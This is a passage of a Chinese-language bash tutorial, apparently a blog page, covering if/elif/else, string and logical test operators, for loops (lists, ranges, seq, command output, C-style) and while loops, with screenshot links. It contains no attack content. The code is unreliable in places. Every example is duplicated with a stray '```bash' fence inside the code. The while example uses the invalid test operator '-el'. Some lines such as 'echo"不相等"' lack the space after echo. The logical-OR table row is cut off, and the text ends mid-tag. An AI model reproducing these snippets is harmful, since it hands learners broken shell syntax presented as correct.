b</td></tr></tbody></table><h4 id="if条件控制语句"><a href="#if条件控制语句" class="headerlink" title="if条件控制语句"></a>if条件控制语句</h4><ul><li>还可配合逻辑与关系运算</li><li>在 <code>[ condition ]</code> 之间一定要有空格，条件和操作符两边都需要空格。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ condition ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 条件成立时执行的命令</span></span><br><span class="line"><span class="keyword">elif</span> [ another_condition ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 如果第一个条件不成立，且第二个条件成立时执行的命令</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 如果上述所有条件都不成立时执行的命令</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="keyword">if</span> [ condition ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 条件成立时执行的命令</span></span><br><span class="line"><span class="keyword">elif</span> [ another_condition ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 如果第一个条件不成立，且第二个条件成立时执行的命令</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 如果上述所有条件都不成立时执行的命令</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><ul><li><code>[]</code>可以删掉，在<code>if</code>前面空格间隔使用<code>test</code>也一样可以输出，但不推荐使用</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"><span class="comment">#判断a是否小于b，为真则输出，假则跳出输出</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt <span class="variable">$b</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;a 小于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"><span class="comment">#判断a是否小于b，为真则输出，假则跳出输出</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt <span class="variable">$b</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;a 小于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128041259.jpg" alt="Pasted-image-20241128041259"></p><ul><li>配合菜单使用</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你要吃什么&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;白米饭&quot;</span> <span class="string">&quot;红米饭&quot;</span> <span class="string">&quot;叉烧饭&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$option</span>&quot;</span> = <span class="string">&quot;白米饭&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;白白的<span class="variable">$option</span>好吃吗？&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$option</span>&quot;</span> = <span class="string">&quot;红米饭&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;红红的<span class="variable">$option</span>好吃吗？&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$option</span>&quot;</span> = <span class="string">&quot;叉烧饭&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$option</span>我最爱吃！&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;请你吃大嘴巴子&quot;</span></span><br><span class="line">        <span class="built_in">break</span>  <span class="comment"># 退出 select 循环</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你要吃什么&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;白米饭&quot;</span> <span class="string">&quot;红米饭&quot;</span> <span class="string">&quot;叉烧饭&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$option</span>&quot;</span> = <span class="string">&quot;白米饭&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;白白的<span class="variable">$option</span>好吃吗？&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$option</span>&quot;</span> = <span class="string">&quot;红米饭&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;红红的<span class="variable">$option</span>好吃吗？&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$option</span>&quot;</span> = <span class="string">&quot;叉烧饭&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$option</span>我最爱吃！&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;请你吃大嘴巴子&quot;</span></span><br><span class="line">        <span class="built_in">break</span>  <span class="comment"># 退出 select 循环</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128044351.jpg" alt="Pasted-image-20241128044351"></p><h2 id="字符运算符与逻辑运算符"><a href="#字符运算符与逻辑运算符" class="headerlink" title="字符运算符与逻辑运算符"></a>字符运算符与逻辑运算符</h2><h3 id="字符运算符："><a href="#字符运算符：" class="headerlink" title="字符运算符："></a>字符运算符：</h3><table><thead><tr><th>运算符</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>=</code></td><td>判断两个字符串是否相等</td><td><code>if [ &quot;$str1&quot; = &quot;$str2&quot; ]; then</code></td></tr><tr><td><code>!=</code></td><td>判断两个字符串是否不相等</td><td><code>if [ &quot;$str1&quot; != &quot;$str2&quot; ]; then</code></td></tr><tr><td><code>-z</code></td><td>判断字符串是否为空</td><td><code>if [ -z &quot;$str&quot; ]; then</code></td></tr><tr><td><code>-n</code></td><td>判断字符串是否非空</td><td><code>if [ -n &quot;$str&quot; ]; then</code></td></tr><tr><td><code>&lt;</code></td><td>判断字符串是否按字典顺序小于另一个字符串（仅支持字符比较）</td><td><code>if [[ &quot;$str1&quot; &lt; &quot;$str2&quot; ]]; then</code></td></tr><tr><td><code>&gt;</code></td><td>判断字符串是否按字典顺序大于另一个字符串（仅支持字符比较）</td><td><code>if [[ &quot;$str1&quot; &gt; &quot;$str2&quot; ]]; then</code></td></tr><tr><td>&#x3D;&#x3D;</td><td>判断两个字符串是否相等（适用于<code>[[ ]]</code> 中）</td><td><code>if [[ &quot;$str1&quot; == &quot;$str2&quot; ]]; then</code></td></tr></tbody></table><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><ol><li>判断相等</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">str1=<span class="string">&quot;hallo&quot;</span></span><br><span class="line">str2=<span class="string">&quot;Hallo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$str1</span> = <span class="variable">$str2</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;相等&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;不相等&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">str1=<span class="string">&quot;hallo&quot;</span></span><br><span class="line">str2=<span class="string">&quot;Hallo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$str1</span> = <span class="variable">$str2</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;相等&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;不相等&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128045507.jpg" alt="Pasted-image-20241128045507"></p><ul><li>为空判断</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">str1=<span class="string">&quot;hallo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="variable">$str1</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;不为空&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;空&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">str1=<span class="string">&quot;hallo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="variable">$str1</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;不为空&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;空&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128045803.jpg" alt="Pasted-image-20241128045803"></p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th>运算符</th><th>说明</th><th>旧语法（不推荐）</th><th>现代语法（推荐）</th><th>示例</th></tr></thead><tbody><tr><td>逻辑“与”</td><td>只有两个条件都为真时，整体为真</td><td><code>-a</code></td><td><code>&amp;&amp;</code></td><td><code>[ condition1 -a condition2 ]</code> 或 <code>[ condition1 ] &amp;&amp; [ condition2 ]</code></td></tr><tr><td>逻辑“或”</td><td>至少一个条件为真时，整体为真</td><td><code>-o</code></td><td>&#96;</td><td></td></tr><tr><td>逻辑“非”</td><td>取反条件，条件为真时变假</td><td><code>!</code></td><td><code>!</code></td><td><code>[ ! condition ]</code></td></tr></tbody></table><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><ul><li>逻辑与运算</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">x=5</span><br><span class="line">y=8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 旧语法 - 使用 -a</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$x</span>&quot;</span> -gt 3 -a <span class="string">&quot;<span class="variable">$y</span>&quot;</span> -lt 10 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;x 大于 3 且 y 小于 10&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;条件不成立&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 现代语法 - 使用 &amp;&amp;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$x</span>&quot;</span> -gt 3 ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$y</span>&quot;</span> -lt 10 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;x 大于 3 且 y 小于 10&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;条件不成立&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">x=5</span><br><span class="line">y=8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 旧语法 - 使用 -a</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$x</span>&quot;</span> -gt 3 -a <span class="string">&quot;<span class="variable">$y</span>&quot;</span> -lt 10 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;x 大于 3 且 y 小于 10&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;条件不成立&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 现代语法 - 使用 &amp;&amp;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$x</span>&quot;</span> -gt 3 ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$y</span>&quot;</span> -lt 10 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;x 大于 3 且 y 小于 10&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;条件不成立&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128051119.jpg" alt="Pasted-image-20241128051119"></p><h2 id="for循环与while循环"><a href="#for循环与while循环" class="headerlink" title="for循环与while循环"></a>for循环与while循环</h2><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><ul><li><code>variable</code>：表示当前循环中的变量，它将依次取 <code>list</code> 中的每个值。</li><li><code>list</code>：可以是一个列表，或者是通过命令生成的输出结果。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> variable <span class="keyword">in</span> list</span><br><span class="line"><span class="keyword">do</span> <span class="comment">#开始</span></span><br><span class="line">    <span class="comment"># 执行的命令</span></span><br><span class="line"><span class="keyword">done</span> <span class="comment">#结束</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="keyword">for</span> variable <span class="keyword">in</span> list</span><br><span class="line"><span class="keyword">do</span> <span class="comment">#开始</span></span><br><span class="line">    <span class="comment"># 执行的命令</span></span><br><span class="line"><span class="keyword">done</span> <span class="comment">#结束</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="遍历固定元素列表"><a href="#遍历固定元素列表" class="headerlink" title="遍历固定元素列表"></a>遍历固定元素列表</h4><ul><li>方法一(不设变量)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> tian <span class="keyword">in</span> <span class="string">&quot;一&quot;</span> <span class="string">&quot;二&quot;</span> <span class="string">&quot;三&quot;</span> <span class="string">&quot;四&quot;</span> <span class="string">&quot;五&quot;</span> <span class="string">&quot;六&quot;</span> <span class="string">&quot;日&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;今天星期<span class="variable">$tian</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> tian <span class="keyword">in</span> <span class="string">&quot;一&quot;</span> <span class="string">&quot;二&quot;</span> <span class="string">&quot;三&quot;</span> <span class="string">&quot;四&quot;</span> <span class="string">&quot;五&quot;</span> <span class="string">&quot;六&quot;</span> <span class="string">&quot;日&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;今天星期<span class="variable">$tian</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129011022.jpg" alt="Pasted-image-20241129011022"></p><ul><li>方法二(设置变量)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个数组</span></span><br><span class="line">fruits=(<span class="string">&quot;一&quot;</span> <span class="string">&quot;二&quot;</span> <span class="string">&quot;三&quot;</span> <span class="string">&quot;四&quot;</span> <span class="string">&quot;五&quot;</span> <span class="string">&quot;六&quot;</span> <span class="string">&quot;日&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;fruits[@]&#125;使用 for 循环遍历数组</span></span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;fruits[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;今天星期<span class="variable">$fruit</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个数组</span></span><br><span class="line">fruits=(<span class="string">&quot;一&quot;</span> <span class="string">&quot;二&quot;</span> <span class="string">&quot;三&quot;</span> <span class="string">&quot;四&quot;</span> <span class="string">&quot;五&quot;</span> <span class="string">&quot;六&quot;</span> <span class="string">&quot;日&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;fruits[@]&#125;使用 for 循环遍历数组</span></span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;fruits[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;今天星期<span class="variable">$fruit</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129011650.jpg" alt="Pasted-image-20241129011650"></p><h4 id="遍历数字范围"><a href="#遍历数字范围" class="headerlink" title="遍历数字范围"></a>遍历数字范围</h4><ul><li>方法一(不设置变量)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历数字范围 1 到 10 间隔为2（可以不要）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..10..2&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;数字是 <span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历数字范围 1 到 10 间隔为2（可以不要）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..10..2&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;数字是 <span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129011844.jpg" alt="Pasted-image-20241129011844"></p><ul><li>方法二(通过<code>seq生成</code>):<code>seq [起始值] [间隔] [结束值]</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 seq 生成数字 1 到 10，间隔为 2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 2 10)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;数字是 <span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 seq 生成数字 1 到 10，间隔为 2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 2 10)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;数字是 <span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129011844.jpg" alt="Pasted-image-20241129011844"></p><h4 id="遍历命令"><a href="#遍历命令" class="headerlink" title="遍历命令"></a>遍历命令</h4><ul><li>for循环和Liunx下的命令配合操作，使用命令的输出的当作字符串返回——<code>$()</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">data=$(<span class="built_in">date</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;日期：<span class="variable">$data</span>&quot;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">data=$(<span class="built_in">date</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;日期：<span class="variable">$data</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129013230.jpg" alt="Pasted-image-20241129013230"></p><ul><li>配合for循环使用获取</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 find 查找所有 .txt 文件，并通过 for 循环处理</span></span><br><span class="line"><span class="keyword">for</span> txt_file <span class="keyword">in</span> $(find /etc -name <span class="string">&quot;*.txt&quot;</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 输出当前正在处理的文件</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;正在查看文件：<span class="variable">$txt_file</span>&quot;</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 打开文件内容并输出</span></span><br><span class="line">    <span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$txt_file</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;====================&quot;</span>  <span class="comment"># 分隔符</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 find 查找所有 .txt 文件，并通过 for 循环处理</span></span><br><span class="line"><span class="keyword">for</span> txt_file <span class="keyword">in</span> $(find /etc -name <span class="string">&quot;*.txt&quot;</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 输出当前正在处理的文件</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;正在查看文件：<span class="variable">$txt_file</span>&quot;</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 打开文件内容并输出</span></span><br><span class="line">    <span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$txt_file</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;====================&quot;</span>  <span class="comment"># 分隔符</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129014738.jpg" alt="Pasted-image-20241129014738"></p><h4 id="配合类似C风格"><a href="#配合类似C风格" class="headerlink" title="(())配合类似C风格"></a><code>(())</code>配合类似C风格</h4><ul><li><code>(())</code>里面可以进行简单的算数运算和条件运算，另外的let命令也可以进行算数运算</li></ul><h5 id="简单语法"><a href="#简单语法" class="headerlink" title="简单语法"></a>简单语法</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((初始值; 条件; 自变量)) <span class="comment">#自变量的值可为: i++ i-- i+=2(每次加2)</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 代码块</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="keyword">for</span> ((初始值; 条件; 自变量)) <span class="comment">#自变量的值可为: i++ i-- i+=2(每次加2)</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 代码块</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h5><ul><li>从1到100</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#i初始值为1，当i小于或等于100时就do一次，然后i自增</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment">#i初始值为1，当i小于或等于100时就do一次，然后i自增</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129020245.jpg" alt="Pasted-image-20241129020245"></p><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#直到条件不成立(假)时停止运行，或者使用循环终止</span></span><br><span class="line"><span class="keyword">while</span> [ 条件 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 需要重复执行的命令</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#直到条件不成立(假)时停止运行，或者使用循环终止</span></span><br><span class="line"><span class="keyword">while</span> [ 条件 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 需要重复执行的命令</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="循环输出数字"><a href="#循环输出数字" class="headerlink" title="循环输出数字"></a>循环输出数字</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -el 5 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;i = <span class="variable">$i</span>&quot;</span></span><br><span class="line">    ((i++))  <span class="comment"># 自增 i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -el 5 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;i = <span class="variable">$i</span>&quot;</span></span><br><span class="line">    ((i++))  <span class="comment"># 自增 i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129021119.jpg" alt="Pasted-image-20241129021119"></p><h4 id="终止语句配合使用"><a href="#终止语句配合使用" class="headerlink" title="终止语句配合使用"></a>终止语句配合使用</h4><ul><li><code>break</code>终止当前循环</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="comment">#设置永为真</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;当前值：<span class="variable">$i</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$i</span> -eq 12 ]; <span class="keyword">then</span> <span 